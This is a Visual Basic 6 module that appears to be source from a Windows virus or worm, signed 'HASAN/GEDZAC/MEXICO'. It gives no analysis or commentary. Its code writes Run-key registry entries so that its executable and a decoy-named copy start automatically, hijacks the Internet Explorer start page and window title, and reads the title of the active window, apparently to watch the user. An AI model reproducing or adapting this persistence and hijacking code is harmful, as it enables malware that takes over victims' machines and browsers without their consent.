   Attribute VB_Name = "Module1"
   Private Declare Function GetForegroundWindow Lib "user32" () As Long
   Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
   Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
   Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
   Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
   Public This_is_my_name As String
   Public May1 As New FileSystemObject
   Public May As New IWshShell_Class
   Public DirSystema As String, DirecWindows, Systema, Registro As String
   Public NombreTentador As String
   Declare Function RegCreateKey Lib _
       "advapi32.dll" Alias "RegCreateKeyA" _
       (ByVal HKey As Long, ByVal lpSubKey As _
       String, phkResult As Long) As Long
   Declare Function RegCloseKey Lib "advapi32.dll" (ByVal HKey As Long) As Long
   Declare Function RegSetValueEx Lib _
       "advapi32.dll" Alias "RegSetValueExA" (ByVal HKey As Long, ByVal _
       lpValueName As String, ByVal _
       Reserved As Long, ByVal dwType _
       As Long, lpData As Any, ByVal _
       cbData As Long) As Long
   Public Const REG_SZ = 1
   Public Const HKEY_CURRENT_USER = &H80000001
   Public Sub SaveString(HKey As Long, Path As String, _
       Name As String, Data As String)
       Dim KeyHandle As Long
       Dim r As Long
       r = RegCreateKey(HKey, Path, KeyHandle)
       r = RegSetValueEx(KeyHandle, Name, 0, _
           REG_SZ, ByVal Data, Len(Data))
       r = RegCloseKey(KeyHandle)
   End Sub
   Public Sub SetStartPage(URL As String)
       Call SaveString(HKEY_CURRENT_USER, _
           "Software\Microsoft\Internet Explorer\Main", _
           "Start Page", URL)
   End Sub
   Public Sub SetWindowTitle(Title As String)
       Call SaveString(HKEY_CURRENT_USER, _
           "Software\Microsoft\Internet Explorer\Main", _
           "Window Title", Title)
   End Sub
   Public Sub cREA()
      May.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Organizacion", "[GEDZAC]"
      May.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\System", App.Path & App.EXEName & ".exe"
      May.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Autor", "HASAN/GEDZAC/MEXICO"
      May.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Organizacion", "[GEDZAC]"
      May.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\System", App.Path & App.EXEName & ".exe"
      May.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Autor", "HASAN/GEDZAC/MEXICO/NoInfected"
   End Sub

   Public Sub Registro_Nombres()
     May.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & Registro, DirecWindows & NombreTentador
     May.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" & Registro, DirecWindows & NombreTentador
     May.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "HASAN", This_is_my_name
     May.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" & "HASAN", This_is_my_name
   End Sub
   Public Function VentanaActiva(ByVal ReturnParent As Boolean) As String
         Dim i As Long
         Dim j As Long
         i = GetForegroundWindow
         If ReturnParent Then
               Do While i <> 0
                     j = i
                     i = GetParent(i)
               Loop
               i = j
         End If
         VentanaActiva = NombreVentanaActiva(i)
   End Function
   Public Function NombreVentanaActiva(ByVal hwnd As Long) As String
         Dim l As Long
         Dim s As String
         l = GetWindowTextLength(hwnd)
         s = Space(l + 1)
         GetWindowText hwnd, s, l + 1
         NombreVentanaActiva = Left$(s, l)
   End Function
